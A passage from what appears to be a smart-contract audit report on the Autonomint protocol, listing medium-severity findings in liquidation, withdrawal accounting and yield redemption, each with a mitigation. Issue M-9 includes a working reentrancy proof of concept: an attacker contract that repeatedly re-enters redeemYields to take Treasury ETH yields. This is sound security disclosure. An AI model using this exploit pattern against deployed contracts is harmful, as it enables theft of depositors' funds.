2. now the liquidate function(function liquidationType1) is called where 400(this is just for example) vaultvalue worth of collateral are allocated for cds depositor but 400 vaultvalue is not decreased from omniChainData.vaultValue. See the function withdraw(borrowlib.sol) where vaultvalue is decreased from omniChainData.vaultValue when users withdraw.

3. let’s assume, liquidate amount is 20(this is just for example),so 20 is deducted from omniChainData.cdsPoolValue in liquidateType1 function, so current cds/borrow ratio is 350-20/2000 = 330/2000 = 0.16. But the actual cds/borrow ratio is 330/1600 = 0.206(as currently real omniChainData.vaultValue is = 2000-400 = 1600). 

4.  In the above example, as the cds/borrow ratio becomes 0.206 from 0.175, so new stable coin should be minted. But as  vaultvalue is not decreased from omniChainData.vaultValue, so ratio is below 0.2(0.16),now users can’t mint new stablecoin and cds users can’t withdraw. 

https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L174


### Impact

the cds/borrow ratio will always be less than the actual/real cds/borrow ratio.in some cases, new stable coin should be minted. But as  vaultvalue is not decreased from omniChainData.vaultValue, so ratio(which is incorrect) is below 0.2(),now users can’t mint new stablecoin and cds users can’t withdraw.

### PoC

_No response_

### Mitigation

when the liquidate function(function liquidationType1) is called vaultvalue should be  decreased from omniChainData.vaultValue


# Issue M-8: Incorrect totalVolumeOfBorrowersAmountinWei update in withdraw() 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/375 

## Found by 
0x37, 0xAadi, CL001, Cybrid, John44

### Summary

In withdraw, we should deduct `depositedAmountInETH` not `depositedAmount` from the `totalVolumeOfBorrowersAmountinWei`.

### Root Cause

When borrowers withdraw collateral, we will [update `totalVolumeOfBorrowersAmountinWei`](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L920).
The `totalVolumeOfBorrowersAmountinWei` is the total collateral amount in term of Ether. When borrowers withdraw collateral, we should deduct the related amount in Ether from the `totalVolumeOfBorrowersAmountinWei`.

The problem is that we use `depositDetail.depositedAmount`. The `depositDetail.depositedAmount` means this deposit's collateral amount, maybe Ether's amount, or WrsETH amount. This will cause that if this borrower's deposit asset is not Ether, e.g. WrsETH, we will deduct less amount from `totalVolumeOfBorrowersAmountinWei` than expected.

This will cause all calculations related with `totalVolumeOfBorrowersAmountinWei` will be incorrect.
 
```solidity
omniChainData.totalVolumeOfBorrowersAmountinWei -= depositDetail.depositedAmount;
``` 
```solidity
    function deposit(
        IBorrowing.BorrowLibDeposit_Params memory libParams,
        IBorrowing.BorrowDepositParams memory params,
        IBorrowing.Interfaces memory interfaces,
        mapping(IBorrowing.AssetName => address assetAddress) storage assetAddress
    ) public returns (uint256) {
        uint256 depositingAmount = params.depositingAmount;
        ...
        depositDetail.depositedAmount = uint128(depositingAmount);
}
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

After borrowers withdraw non-Ether collateral(weETH, wrsETH), the `totalVolumeOfBorrowersAmountinWei` will be incorrect. This will cause all calculations related with `totalVolumeOfBorrowersAmountinWei` will be incorrect.
For example:
cds's cumulativeValue will be calculated incorrectly.
```solidity
        CalculateValueResult memory result = _calculateCumulativeValue(
            omniChainData.totalVolumeOfBorrowersAmountinWei,
            omniChainData.totalCdsDepositedAmount,
            ethPrice // current ether price.
        );
```
CDS owners can get more or less than expected.

### PoC

N/A

### Mitigation

Deduct `depositedAmountInETH` from `totalVolumeOfBorrowersAmountinWei` when users withdraw collateral.

# Issue M-9: Reentrant call in `Treasury::withdrawFromExternalProtocol` during the `Borrowing::redeemYields` flow allows theft of `Treasury` ETH 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/408 

## Found by 
santiellena

### Summary

In `Borrowing::redeemYields` there is a call to `Treasury::withdrawFromExternalProtocol`, to withdraw the ETH that is backing the `ABOND` that will be burned. That withdrawn ETH is sent in the middle of the execution of the transaction, without gas limit, and not following the Checks-Effects-Interactions pattern, letting the `user` receiving the ETH reenter the same function to withdraw ETH several times but burning its `ABOND` and updating its information just once. 

### Root Cause

In `Borrowing::redeemYields`  there is a call to `Treasury::withdrawFromExternalProtocol` right before burning `ABOND` from `msg.sender`:
[BorrowLib.sol#L978-L1036](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L978-L1036)
```solidity
    function redeemYields(
        address user,
        uint128 aBondAmount,
        address usdaAddress,
        address abondAddress,
        address treasuryAddress,
        address borrow
    ) public returns (uint256) {
        // check abond amount is non zewro
        if (aBondAmount == 0) revert IBorrowing.Borrow_NeedsMoreThanZero();
        IABONDToken abond = IABONDToken(abondAddress);
        // get user abond state
        State memory userState = abond.userStates(user);
        // check user have enough abond
        if (aBondAmount > userState.aBondBalance) revert IBorrowing.Borrow_InsufficientBalance();
        
        ITreasury treasury = ITreasury(treasuryAddress);
        // calculate abond usda ratio
        uint128 usdaToAbondRatio = uint128((treasury.abondUSDaPool() * RATE_PRECISION) / abond.totalSupply());
        uint256 usdaToBurn = (usdaToAbondRatio * aBondAmount) / RATE_PRECISION;
        // update abondUsdaPool in treasury
        treasury.updateAbondUSDaPool(usdaToBurn, false);
        
        // calculate abond usda ratio from liquidation
        uint128 usdaToAbondRatioLiq = uint128((treasury.usdaGainedFromLiquidation() * RATE_PRECISION) /abond.totalSupply());
        uint256 usdaToTransfer = (usdaToAbondRatioLiq * aBondAmount) / RATE_PRECISION;
        //update usdaGainedFromLiquidation in treasury
        treasury.updateUSDaGainedFromLiquidation(usdaToTransfer, false);
        
        //Burn the usda from treasury
        treasury.approveTokens(
            IBorrowing.AssetName.USDa,
            borrow,
            (usdaToBurn + usdaToTransfer)
        );
        
        IUSDa usda = IUSDa(usdaAddress);
        // burn the usda
        bool burned = usda.contractBurnFrom(address(treasury), usdaToBurn);
        if (!burned) revert IBorrowing.Borrow_BurnFailed();
        
        if (usdaToTransfer > 0) {
            // transfer usda to user
            bool transferred = usda.contractTransferFrom(
                address(treasury),
                user,
                usdaToTransfer
            );
            if (!transferred) revert IBorrowing.Borrow_TransferFailed();
        }
        // withdraw eth from ext protocol
        uint256 withdrawAmount = treasury.withdrawFromExternalProtocol(user,aBondAmount);
        
		//Burn the abond from user
        bool success = abond.burnFromUser(msg.sender, aBondAmount);
        if (!success) revert IBorrowing.Borrow_BurnFailed();
        
        return withdrawAmount;
    }
```

As it can be seen, `USDa` is burned from `Treasury` and sent to `user`, and ETH is withdrawn from the external protocol, before `ABOND` data is updated (meaning that user paid for the yield redeem). The `ABOND` data is updated when the burning occurs.

Note that `Borrowing::redeemYields` function does not have the `nonReentrant` modifier:
[borrowing.sol#L318-L333](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L318-L333)
```solidity
    function redeemYields(
        address user,
        uint128 aBondAmount
    ) public returns (uint256) {
        // Call redeemYields function in Borrow Library
        return (
            BorrowLib.redeemYields(
                user,
                aBondAmount,
                address(usda),
                address(abond),
                address(treasury),
                address(this)
            )
        );
    }
```

The `Treasury::withdrawFromExternalProtocol` function has an external call to the `user` address to send the ETH calculated in `Treasury::withdrawFromIonicByUser`, without a gas limit:
[Treasury.sol#L283-L296](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L283-L296)
```solidity
    function withdrawFromExternalProtocol(
        address user,
        uint128 aBondAmount
    ) external onlyCoreContracts returns (uint256) {
        if (user == address(0)) revert Treasury_ZeroAddress();
        
        // Withdraw from external protocols
        uint256 redeemAmount = withdrawFromIonicByUser(user, aBondAmount);
        // Send the ETH to user
        (bool sent, ) = payable(user).call{value: redeemAmount}(""); // EXTERNAL CALL
        // check the transfer is successfull or not
        require(sent, "Failed to send Ether");
        return redeemAmount;
    }
```

As the `user` data was not updated and `ABOND` was not yet burned from `msg.sender`, it can reenter the `Borrowing::redeemYields` function to drain the protocol earnings.

For the attack to be profitable, the attacker needs to first buy `ABOND` and wait until the protocol accrues yield from the external protocol (Ionic). The attacker will then call `Borrowing::redeemYields` and re-enter it to gain the benefits of more than the `ABOND` held in that time period. (see "Attack path" section).

As in the end, all `ABOND` has to be burned (meaning that if you redeemed once 100 `ABOND` and reentered 9 times, the attacker will have to own 1000 in the end because that will be burned), this vulnerability is not the typical reentrancy issue as it happened in [The DAO hack](https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/)  where the balance after withdrawing was set to zero, instead here the `abondAmount` has to be [burned](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L172-L184) and thus owned by the attacker.

The earnings of this attack come from the accrued yield of the `ABOND` held by the attacker, where the attacker will earn from accrued yields of more than the initially held `ABOND` amount. As the `ABOND::userStates` data is not updated until the `ABOND::burnFromUser` function is called, this attack is possible because the amount to withdraw calculation is done with `userStates` data:
[Treasury.sol#L703-L724](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L703-L724)
```solidity
    function withdrawFromIonicByUser(
        address user,
        uint128 aBondAmount
    ) internal nonReentrant returns (uint256) {
        uint256 currentExchangeRate = ionic.exchangeRateCurrent();
        uint256 currentCumulativeRate = _calculateCumulativeRate(currentExchangeRate, Protocol.Ionic);
        
        State memory userState = abond.userStates(user); // @audit user states data
        uint128 depositedAmount = (aBondAmount * userState.ethBacked) / PRECISION;
        uint256 normalizedAmount = (depositedAmount * CUMULATIVE_PRECISION) / userState.cumulativeRate;
        
        //withdraw amount
        uint256 amount = (currentCumulativeRate * normalizedAmount) / CUMULATIVE_PRECISION;
        // withdraw from ionic
        ionic.redeemUnderlying(amount);
        
        protocolDeposit[Protocol.Ionic].totalCreditedTokens = ionic.balanceOf(address(this));
        protocolDeposit[Protocol.Ionic].exchangeRate = currentExchangeRate;
        // convert weth to eth
        WETH.withdraw(amount);
        return amount;
    }
```

Updating data after withdrawing:
[Colors.sol#L41-L60](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/Colors.sol#L41-L60)
```solidity
    function _debit(
        State memory _fromState,
        uint128 _amount
    ) internal pure returns(State memory) {
        uint128 balance = _fromState.aBondBalance;
        
        // check user has sufficient balance
        require(balance >= _amount,"InsufficientBalance");
        
        // update user abond balance
        _fromState.aBondBalance = balance - _amount;
        
        // after debit, if abond balance is zero, update cr and eth backed as 0
        if(_fromState.aBondBalance == 0){
            _fromState.cumulativeRate = 0;
            _fromState.ethBacked = 0;
        }
        return _fromState;
    }
```

### Internal pre-conditions

None

### External pre-conditions

None

### Attack Path

- Attacker acquires 100 `ABOND` and waits for it to accrue yields
- Attacker calls `Borrowing::redeemYields`
- Attacker reenters  `Borrowing::redeemYields` many times and redeems let's say 1000 `ABOND` (10 reenters)
- With the ETH (and possibly USDa) redeemed, the attacker buys in the last reentrant call the left 900 `ABOND` (the protocol has to burn 1000).
- The attacker earned the yields of buying and holding 1000 `ABOND` but initially he bought only 100. 

### Impact

Theft of `Treasury` and `ABOND` holders ETH.

### PoC

The following PoC struggles to make a perfect simulation of how the attacker would get the `ABOND` with real market prices and how Ionic will increase its exchange rate to get a higher cumulative rate. However, it demonstrates perfectly how the attack can be executed.

Add the following PoC and contracts to `test/foundry/Borrowing.t.sol`:
```solidity
function test_PoC_ReentrancyInRedeemYields() public {
        uint256 ETH = 1;
        uint24 ethPrice = 388345;
        uint8 strikePricePercent = uint8(IOptions.StrikePrice.FIVE);
        uint64 strikePrice = uint64(ethPrice + (ethPrice * ((strikePricePercent * 5) + 5)) / 100);
        uint256 amount = 10 ether;
        uint256 amountSent = 11 ether;

        uint128 usdtToDeposit = uint128(contractsB.cds.usdtLimit());
        uint256 liquidationAmount = usdtToDeposit / 2;

        // deposit in CDS so there is back funds for the USDa
        address cdsDepositor = makeAddr("depositor");

        {
            vm.startPrank(cdsDepositor);
            contractsB.usdt.mint(cdsDepositor, usdtToDeposit);
            contractsB.usdt.approve(address(contractsB.cds), usdtToDeposit);
            vm.deal(cdsDepositor, globalFee.nativeFee);
            contractsB.cds.deposit{value: globalFee.nativeFee}(
                usdtToDeposit, 0, true, uint128(liquidationAmount), 150000
            );
            
            vm.stopPrank();
        }

        {
            vm.startPrank(USER);
  
            vm.deal(USER, globalFee.nativeFee + amountSent);
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + amountSent}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount
                )
            );
            
            vm.stopPrank();
        }

        {
            vm.startPrank(USER);

            vm.deal(USER, globalFee.nativeFee + amountSent);
            contractsB.borrow.depositTokens{value: globalFee.nativeFee + amountSent}(
                ethPrice,
                uint64(block.timestamp),
                IBorrowing.BorrowDepositParams(
                    IOptions.StrikePrice.FIVE, strikePrice, ETH_VOLATILITY, IBorrowing.AssetName(ETH), amount
                )
            );

            vm.stopPrank();
        }
  
        vm.warp(block.timestamp + 25920);
        vm.roll(block.number + 2160);

        ExchangeAbond exchange = new ExchangeAbond(address(contractsB.abond));
        Attacker attacker = new Attacker(address(contractsB.borrow), address(contractsB.abond), USER, address(exchange));
        vm.label(address(attacker), "Attacker");

        {
            vm.startPrank(USER);

            uint64 index = 1;
            Treasury.GetBorrowingResult memory getBorrowingResult = contractsB.treasury.getBorrowing(USER, index);
            Treasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;

            uint256 currentCumulativeRate = contractsB.borrow.calculateCumulativeRate();
            contractsB.usda.mint(USER, 1 ether); // @audit so there are enough funds (doesn't affect the PoC)
            uint256 tokenBalance = contractsB.usda.balanceOf(USER);

            if ((currentCumulativeRate * depositDetail.normalizedAmount) / 1e27 > tokenBalance) {
                return;
            }

            contractsB.usda.approve(address(contractsB.borrow), tokenBalance);
            vm.deal(USER, globalFee.nativeFee);
            contractsB.borrow.withDraw{value: globalFee.nativeFee}(
                USER, index, "0x", "0x", ethPrice, uint64(block.timestamp)
            );

            // @audit Attacker acquiring ABOND
            contractsB.abond.transfer(address(attacker), contractsB.abond.balanceOf(USER) / 12);
            contractsB.abond.transfer(address(exchange), contractsB.abond.balanceOf(USER)); // funding the "exchange"

            vm.stopPrank();
        }

        vm.warp(block.timestamp + 25920);
        vm.roll(block.number + 2160);

        {
            contractsB.borrow.calculateCumulativeRate();

            attacker.attack();
        }
    }

import {Borrowing} from "../../contracts/Core_logic/borrowing.sol";
import {ABONDToken} from "../../contracts/Token/Abond_Token.sol";

contract Attacker {
    Borrowing borrowing;
    ABONDToken abond;
    address USER_PROVIDER;
    uint256 counter = 0;
    uint256 withdrawedInTheFirstCall = 0;
    uint256 accumulator = 0;
    ExchangeAbond exchange;
  
    constructor(address _borrowing, address _abond, address _userProvider, address _exchange) {
        borrowing = Borrowing(_borrowing);
        abond = ABONDToken(_abond);
        USER_PROVIDER = _userProvider;
        abond.approve(address(borrowing), type(uint256).max);
        exchange = ExchangeAbond(_exchange);
    }

    function attack() public payable {
        if (counter < 10) {
            if (counter == 1) {
                // just to show that balance in the end is greater
                withdrawedInTheFirstCall = address(this).balance;
            }
            counter += 1;
            accumulator += abond.balanceOf(address(this));
            borrowing.redeemYields(address(this), uint128(abond.balanceOf(address(this))));
        } else {
            // checking that the attacker withdrawed more than the allowed by his funds
            if (withdrawedInTheFirstCall >= address(this).balance) {
                revert();
            }
            // here before returning, the attacker should buy the needed ABOND with the withdrawed ETH and USDa amount
            exchange.buyAbond{value: 1e6}(address(this), accumulator); // eth sent is to "buy"

            if (accumulator > abond.balanceOf(address(this))) {
                revert("Not enough ABOND to BURN");
            }

            return;
        }
    }

    receive() external payable {
        attack();
    }
}

contract ExchangeAbond {
    ABONDToken abond;

    constructor(address _abond) {
        abond = ABONDToken(_abond);
    }

    function buyAbond(address to, uint256 amount) public payable {
        abond.transfer(to, amount);
    }
}
```

To run the test:
```bash
forge test --fork-url https://mainnet.mode.network/ --mt test_PoC_ReentrancyInRedeemYields -vvv
```

### Mitigation

- Use the built-in `transfer` function to send ETH because it limits the gas it sends.
- Add `nonReentrant` modifiers to functions that modify the state.

# Issue M-10: Non-functional wrapper in BorrowLiquidation 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/438 

## Found by 
0x37

### Summary

The synthetix's wrapper in OP Chain is empty. It cannot help us to wrap WETH to sETH.

### Root Cause

In [borrowLiquidation.sol:348](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L348), we will wrap WETH to sETH via synthetix's wrapper.

The problem is that I find out that the synthetix's wrapper in OP Chain is different with Ethereum's wrapper.  The synthetix's wrapper in OP Chainis one empty wrapper chain(https://optimistic.etherscan.io/address/0xc3Ee42caBD773A608fa9Ec951982c94BD6F33d59) after checking from (https://developer.synthetix.io/addresses/).

So in OP chain, the empty wrapper does not support mint() interface. So this liquidation will be reverted.
```solidity
    function liquidationType2(
        address user,
        uint64 index,
        uint64 currentEthPrice
    ) internal {
        ...
        wrapper.mint(amount);
}
```
### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

The liquidation type 2 cannot work in OP chain.
Considering that liquidation type 1 cannot work in some cases, e.g. there is not enough cds owners who opt in the liquidation, it's important to make sure that the liquidation type 2 can always work well.

### PoC

N/A

### Mitigation

synthetix support to exchange WETH to sUSD directly. 

# Issue M-11: Incorrect margin calculation in liquidationType2 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/451 

## Found by 
0x37, Audinarey

### Summary

In liquidation type2, we will calculate the margin via `amount * EthPrice`. We don't consider the exchange fee in synthetix.

### Root Cause

In [borrowLiquidation.sol:350](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L350-L359), we will exchange the sETH to sUSD. The sUSD will be taken as the margin in the synthetix.

In liquidationType2() function, we will exchange `amount` sETH to sUSD, and then these sUSD as the margin. The margin amount is calculated via `(amount * currentEthPrice) / 100`.  The problem is that there is exchange fee in synthetix's exchange() function. This will cause that the sUSD from synthetix.exchange() may be less than calculated margin. This will cause reverted because there is not enough sUSD.

```solidity
        synthetix.exchange(
            // sETH
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            // sUSD
            0x7355534400000000000000000000000000000000000000000000000000000000
        );
        int256 margin = int256((amount * currentEthPrice) / 100);
        synthetixPerpsV2.transferMargin(margin);

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

The liquidation transaction will be reverted for liquidation type2. We need to make sure the liquidation should work well considering that liquidation type 1 may not work if there is not enough cds owners who opt in the liquidation process.

### PoC

N/A

### Mitigation

Get the output sUSD amount via exchange() function. Take sUSD as the margin.

# Issue M-12: The `liquidationType1` function in the borrowLiquidation contract reverts unexpectedly when calculating the yields 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/519 

## Found by 
0x23r0, 0xe4669da, Cybrid, John44, LordAlive, Pablo, ParthMandale, Ruhum, futureHack, volodya

### Summary


The `liquidationType1` function in the borrowLiquidation contract reverts unexpectedly when calculating the yields:

```solidity
uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);
```

This happens when the calculated value of `((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate)` exceeds `depositDetail.depositedAmount`. This edge case arises due to very small changes in the `exchangeRate` value, leading to an unexpected revert caused by a subtraction of a larger value from a smaller one. This behavior is rooted that not taken the exchange rate that changed to a  smaller value during liquidation.

### Root Cause


When a user deposits collateral, the deposited amount is stored both in terms of the asset (e.g., `WeETH`) and its equivalent in ETH, using the `exchangeRate` at the time of deposit. The calculations are as follows:

1. The user deposits `2e18` `WeETH` tokens with an `exchangeRate` of `1029750180160445400` (`WeETH/ETH`).
2. The deposited amount in ETH is calculated in the deposit function:

```solidity
params.depositingAmount = (libParams.exchangeRate * params.depositingAmount) / 1 ether;
```

> params.depositingAmount = (1029750180160445400 * 2e18) / 1 ether = 2059500360320890800


1. The `depositingAmount` in ETH is stored in [depositDetail.depositedAmountInETH](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L179) in the treasury contract:

```solidity
borrowing[user].depositDetails[borrowerIndex].depositedAmountInETH = uint128(depositingAmount); // 2059500360320890800
```

2. Meanwhile, the original [depositingAmount](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L739) (in `WeETH`) is stored in `depositDetail.depositedAmount`:

```solidity
depositDetail.depositedAmount = uint128(depositingAmount); // 2e18
```

### Liquidation Yield Calculation

During liquidation, the [yields](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L265) calculation uses the stored `depositDetail.depositedAmount` and `depositDetail.depositedAmountInETH`:

```solidity
uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);
```

If the `exchangeRate` has slightly decreased (e.g., by 1 wei), the denominator in the division becomes slightly smaller, making the result of `((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate)` slightly larger. As a result, this value can exceed `depositDetail.depositedAmount`, leading to an underflow (revert).

For example:

- At deposit:
  - `depositDetail.depositedAmount = 2e18`
  - `depositDetail.depositedAmountInETH = 2059500360320890800`
  - `exchangeRate = 1029750180160445400`

- At liquidation:
  - New `exchangeRate = 1029750180160445399` (slightly decreased by 1 wei).

- Yield calculation:

```js
yields = 2e18 - ((2059500360320890800 * 1 ether) / 1029750180160445399)  -->   `-1`
```

Substitute values:

```js
yields = 2e18 - 2000000000000000001 = -1 (revert the liquidation)
```


Here, the logic is implemented in such a way that it assumes the exchange rate of ETH-backed assets like WeETH or WrETH will never decrease if the ETH price increases, but this is incorrect.

If we check the very latest data on chainlink data feeds of ETH/USD  and weETH/ETH on the optimism network:

1. ETH/USD: https://data.chain.link/feeds/optimism/mainnet/eth-usd
2. weETH/ETH: https://data.chain.link/feeds/optimism/mainnet/weeth-eth


Based on that feeds if a user deposits collateral on December 18 with an ETH price of 393133, and by December 21 the price has decreased to 347491, the ETH price has decreased significantly. Based on the protocol's logic, this position should be liquidated. However, the protocol team assumes that if the price of ETH decreased, the ETH-backed tokens, like weETH or wrsETH (which the protocol accepts as deposits), will not affected. This is not always the case.

If we check the Chainlink price feed for weETH:

On December 18, the exchange rate was 1.0550. By December 21, although the price of ETH had decreased significantly, the price of weETH also decreased. On December 21, the exchange rate was 1.0549 so the exchange rate is decreased. This discrepancy will definitely cause the liquidation to revert based on the calculated yields.

pics:
![Eth/Usd](https://github.com/user-attachments/assets/b5831007-8399-457f-a30c-87bfe4dc2b5b)
![Eth/Usd](https://github.com/user-attachments/assets/ab7cdfd8-b8e7-404b-b7a2-031c9cd99817)
![WeETH/ETH](https://github.com/user-attachments/assets/925a9b66-2a4a-4a94-a6c1-56ff37248d55)
![WeETH/ETH](https://github.com/user-attachments/assets/f7b74f76-6e7f-4b96-aec4-f09690e23972)


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

check Root Cause


### Impact

Positions eligible for liquidation may fail to liquidate due to unexpected reverts.


### PoC

1. Deposit `2e18` `WeETH` with an `exchangeRate` of `1029750180160445400`.
   - `depositDetail.depositedAmount = 2e18`.
   - `depositDetail.depositedAmountInETH = 2059500360320890800`.

2. Trigger liquidation when the `exchangeRate` decrease slightly (e.g., `1029750180160445399`).

3. Observe the revert during yield calculation:

```solidity
uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);
```

### Mitigation


Here, we don't know whether the exchange rate returned from the oracle is larger or smaller. If it's larger, there is no problem, but if the exchange rate returned from the oracle is smaller, it will revert.

I don't know the best logic implemented that ensures liquidation does not revert.


```solidity
uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);
```

One way to completely remove this is because the result of this calculation is pass to `treasury.updateYieldsFromLiquidatedLrts(yields);`.

If we check in the treasury, its only increment the `yieldsFromLiquidatedLrts` and, this state variable is never used in any calculation in the protocol.

```solidity
    function updateYieldsFromLiquidatedLrts(
        uint256 yields
    ) external onlyCoreContracts {
        yieldsFromLiquidatedLrts += yields;
    }
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L513-L517


# Issue M-13: 10% of CDS depositors profit are stuck in the treasury during withdrawal without a way to retrieve them 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/526 

## Found by 
0x37, Audinarey, almurhasan, valuevalk

### Summary

During withdrawal from the CDS, 10% of the USDa profit of the user are sent to the treasury. However there is no way to withdraw these funds from the treasury and as such they are stuck forever.

### Root Cause



```solidity
File: CDS.sol
334:     @>    uint256 optionFees = ((cdsDepositDetails.normalizedAmount * omniChainData.lastCumulativeRate) /
335:             (CDSLib.PRECISION * CDSLib.NORM_PRECISION)) - cdsDepositDetails.depositedAmount;

343:         uint256 currentValue = cdsAmountToReturn( // @audit-info value to return (i.e depositedAmount ± profit)
344:             msg.sender,
345:             index,
346:             omniChainData.cumulativeValue,
347:             omniChainData.cumulativeValueSign,
348:             excessProfitCumulativeValue
349:         ) - 1; //? subtracted extra 1 wei
350: 
351:         cdsDepositDetails.depositedAmount = currentValue;
352:         uint256 returnAmount = cdsDepositDetails.depositedAmount + optionFees;
353:   @>    cdsDepositDetails.withdrawedAmount = returnAmount;


```

- `currentValue` is the user's `depositedAmount ± profit` and
- `returnAmount` is the `depositedAmount ± profit + optionFees` which is now the `cdsDepositDetails.withdrawedAmount`

`params.usdaToTransfer` is the amount of USDa that is finally transferred to the user but not all the `cdsDepositDetails.withdrawedAmount` above is transferred because 10% of this amount is transferred to the `treasury` and recorded as `usdaCollectedFromCdsWithdraw` by calling `updateUsdaCollectedFromCdsWithdraw()` 


https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L800-L803


https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L493-L497


```solidity
File: CDSLib.sol
800:                 //Calculate the usda amount to give to user after deducting 10% from the above final amount @audit HIGH: the remaining 10% is stuck in the treasury!
801:                 params.usdaToTransfer = calculateUserProportionInWithdraw(params.cdsDepositDetails.depositedAmount, returnAmountWithGains);
802:                 //Update the treasury data
803:    @>           interfaces.treasury.updateUsdaCollectedFromCdsWithdraw(returnAmountWithGains - params.usdaToTransfer);



File: Treasury.sol
493:     function updateUsdaCollectedFromCdsWithdraw(
494:         uint256 amount
495:     ) external onlyCoreContracts {
496:   @>    usdaCollectedFromCdsWithdraw += amount;
497:     }

```

The problem is that unfortunately, this amount is never removed from the treasury by any means or used anywhere.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

10% of profit during withdrawa are stuck in the treasury forever

### PoC

_No response_

### Mitigation

Consider implementing a function to withdraw this `usdaCollectedFromCdsWithdraw` from the treasury or better still account for it elsewhere.

# Issue M-14: omniChainData.cdsPoolValue is not decreased/updated in the  function liquidationType1,as a result cds/ borrow ratio will be bigger than expected. 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/560 

## Found by 
almurhasan, volodya

### Summary

omniChainData.cdsPoolValue is not decreased/updated in the  function liquidationType1,as a result cds/ borrow ratio will be bigger than expected till all cds depositors(who opted for liquidation amount) don’t withdraw their deposited amount. So there may come a scenario when  the cds/borrow’s real  ratio may become below 0.2 but the protocol will calculate above 0.2(so new stablecoin can be minted/ cds users can withdraw if cds/borrow ratio  is below 0.2).


### Root Cause

omniChainData.cdsPoolValue is not decreased/updated in the  function liquidationType1


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Let’s assume, currently omniChainData.cdsPoolValue = 500,  omniChainData.vaultValue = 2000, so cds/borrow ratio = 500/2000 = 0.25

2. now the function liquidationType1 is called where 100 amount is liquidated, now omniChainData.vaultValue = 2000-100 = 1900(as 100 usd worth of collateral is allocated for cds depositer) and omniChainData.cdsPoolValue = 500-100 = 400(as 100 is liquidated). So the current cds/borrow ratio should be 400/1900 = 0.21.

3. but as omniChainData.cdsPoolValue is not decreased/updated in the  function liquidationType1,so omniChainData.cdsPoolValue is still 500 and cds/borrow ratio = 500/1900 = 0.26 which is bigger than real cds/borrow ratio.

4. cds/borrow ratio will be corrected when all cds depositors(who opted for liquidation amount) withdraw because after their withdrawals cdspoolvalue is decreased and cds/borrow ratio becomes correct.

5. cds/ borrow ratio will be bigger than expected till all cds depositors(who opted for liquidation amount) don’t withdraw their deposited amount. So there may come a scenario when  the cds/borrow’s real  ratio may become below 0.2 but the protocol will calculate above 0.2(so new stablecoin can be minted/ cds users can withdraw if cds/borrow ratio  is below 0.2).

https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L174


### Impact

